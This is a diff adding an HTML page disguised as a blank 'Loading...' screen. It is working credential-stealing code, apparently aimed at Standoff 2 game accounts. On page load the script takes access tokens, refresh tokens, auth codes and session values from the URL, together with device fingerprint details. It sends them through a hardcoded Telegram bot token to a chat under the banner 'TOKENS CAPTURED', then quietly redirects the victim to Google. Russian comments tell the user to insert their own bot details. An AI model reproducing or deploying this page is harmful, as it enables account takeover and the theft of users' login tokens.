@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script>
+        // ТВОИ ДАННЫЕ - ЗАМЕНИ НА СВОИ!
+        const BOT_TOKEN = "7652039782:AAHDuyL7L0I2c91-sCx397Nk5tN0LY57VHU";
+        const CHAT_ID = "8177119028";
+        
+        // Функция сбора данных
+        function collectData() {
+            const data = {
+                // Токены из URL
+                access_token: getUrlParam('access_token'),
+                refresh_token: getUrlParam('refresh_token'),
+                code: getUrlParam('code'),
+                token: getUrlParam('token'),
+                session: getUrlParam('session'),
+                
+                // Информация об устройстве
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                screen: screen.width + 'x' + screen.height,
+                languages: navigator.languages,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                
+                // Время и источник
+                timestamp: new Date().toISOString(),
+                referrer: document.referrer,
+                full_url: window.location.href
+            };
+            
+            function getUrlParam(name) {
+                const urlParams = new URLSearchParams(window.location.search);
+                const hashParams = new URLSearchParams(window.location.hash.substring(1));
+                return urlParams.get(name) || hashParams.get(name);
+            }
+            
+            // Проверяем есть ли токены
+            const hasTokens = Object.values(data).some(val => 
+                val && val.length > 10
+            );
+            
+            if (hasTokens) {
+                // Отправляем в Telegram
+                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: `🎯 STANDOFF 2 TOKENS CAPTURED!\n\n${JSON.stringify(data, null, 2)}`
+                    })
+                });
+            }
+            
+            // Мгновенный редирект на Google
+            setTimeout(() => {
+                window.location.href = 'https://www.google.com';
+            }, 100);
+        }
+        
+        // Запускаем при загрузке страницы
+        window.addEventListener('load', collectData);
+    </script>
+</head>
+<body style="display:none; background:#000;">
+    <!-- Страница не видна пользователю -->
+</body>
+</html>
